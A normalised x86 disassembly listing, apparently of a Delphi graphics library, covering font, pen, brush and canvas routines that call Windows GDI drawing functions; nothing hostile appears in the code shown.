mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422e94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422fb4
mov eax [ ebp - 0x4 ]
call sub_422da4
retn
mov eax ebx
mov si 0xfffd
call sub_40338c
sub_422fbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d98
xor eax eax
push ebp
push sub_423018
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42301f
mov eax [ ebp - 0x4 ]
call sub_422da4
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40338c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422e94
sub_423028
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d98
xor edx edx
push ebp
push sub_423087
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42308e
mov eax [ ebp - 0x4 ]
call sub_422da4
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418834
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423131
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418470
mov ebx eax
mov eax ebx
call sub_424660
inc [ ebp - 0x4 ]
mov eax ebx
call sub_424a2c
mov eax [ rw-data ]
call sub_423028
mov eax [ rw-data ]
call sub_423028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423138
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418898
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418470
call sub_424904
inc esi
dec ebx
jne r-xdata
sub_423787
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417d94
retn
sub_4237b8
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402ca4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a94
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_42386c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4238c0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_423904
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_4239bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c4
xor eax eax
push ebp
push sub_4239a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fbc
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423a40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4239a9
mov eax [ ebp - 0x8 ]
call sub_4235d4
retn
mov eax ebx
call sub_423cc4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423ce0
sub_4239f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_423a35
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a3c
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_423a54
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423bdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423be4
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f44
retn
mov eax [ rw-data ]
call sub_422d98
xor eax eax
push ebp
push sub_423bb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404184
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40873c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404184
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40873c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404184
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407ee4
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_423d38
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423bfc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_4237b8
mov edx esp
mov eax ebx
call sub_4239f0
add esp 0x2c
pop esi
pop ebx
retn
sub_423c28
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4239d8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4239f0
add esp 0x2c
pop esi
pop ebx
retn
sub_423c68
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4239d8
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402ba4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4041bc
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a94
mov edx esp
mov eax ebx
call sub_4239f0
sub_423ce0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_423c28
pop esi
pop ebx
retn
sub_423d0c
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4239d8
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4239f0
add esp 0x30
pop ebx
retn
sub_423d40
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4239d8
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4239f0
add esp 0x2c
pop esi
pop ebx
retn
sub_423d70
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4239d8
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4239f0
add esp 0x2c
pop esi
pop ebx
retn
sub_423d98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db0
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_423ddc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_423e04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_423ea3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c4
xor eax eax
push ebp
push sub_423e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fbc
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423fec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e8d
mov eax [ ebp - 0x8 ]
call sub_4235d4
retn
sub_423ebc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423ed4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_423f19
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f20
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_423f2c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423ebc
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423ed4
add esp 0x10
pop esi
pop ebx
retn
sub_423f54
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422d98
xor eax eax
push ebp
push sub_423fda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da4
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423580
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_424008
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423ebc
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423ed4
add esp 0x10
pop esi
pop ebx
retn
sub_424038
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423ebc
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423ed4
sub_424064
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db0
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4240a4
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4240cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418a84
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_42415c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c4
xor eax eax
push ebp
push sub_42413f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424146
mov eax [ ebp - 0x8 ]
call sub_4235d4
retn
sub_424174
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424190
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_4241d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241dc
mov eax [ ebp - 0x4 ]
call sub_4235d4
retn
sub_4241e0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424190
add esp 0x10
pop edi
pop esi
retn
sub_42420c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424174
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424190
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424240
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422d98
xor edx edx
push ebp
push sub_42430d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423580
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424328
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424174
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424190
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_42435c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c54
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d98
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c74
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424064
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424c94
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4187ac
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_424420
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418848
xor edx edx
mov eax esi
call sub_424a8c
mov eax [ esi + 0xc ]
call sub_403190
mov eax [ esi + 0x10 ]
call sub_403190
mov eax [ esi + 0x14 ]
call sub_403190
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42447c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424ae0
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424504
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax [ ebx + 0x14 ]
call sub_424204
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423580
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416e34
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4245b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax [ ebx + 0x14 ]
call sub_424240
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4245ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax [ ebx + 0x14 ]
call sub_424240
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424628
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424688
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4246b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4246ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424734
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424770
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_424a0c
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_42479c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424ae0
mov eax ebx
call sub_424770
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_42486c
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_424688
mov eax ebx
mov edx [ eax ]
